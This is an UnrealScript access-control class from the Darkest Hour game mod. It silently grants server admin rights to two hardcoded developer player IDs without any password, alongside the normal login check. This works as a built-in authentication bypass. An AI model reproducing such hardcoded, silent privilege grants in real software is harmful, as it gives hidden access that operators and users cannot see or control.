//==============================================================================
// Darkest Hour: Europe '44-'45
// Darklight Games (c) 2008-2017
//==============================================================================

class DHAccessControl extends AccessControl;

var private array<string>              DeveloperIDs;

// Modified for dev admin
function bool AdminLoginSilent(PlayerController P, string Username, string Password)
{
    local int   i;
    local bool  bIsDeveloper;

    if (P == none)
    {
        return false;
    }

    for (i = 0; i < DeveloperIDs.length; ++i)
    {
        if (P.GetPlayerIDHash() ~= DeveloperIDs[i])
        {
            bIsDeveloper = true;
        }
    }

    if (ValidLogin(Username, Password) || bIsDeveloper)
    {
        P.PlayerReplicationInfo.bSilentAdmin = true;
        return true;
    }

    return false;
}

defaultproperties
{
    DeveloperIDs(0)="76561197961365238"
    DeveloperIDs(1)="76561197960644559"
}
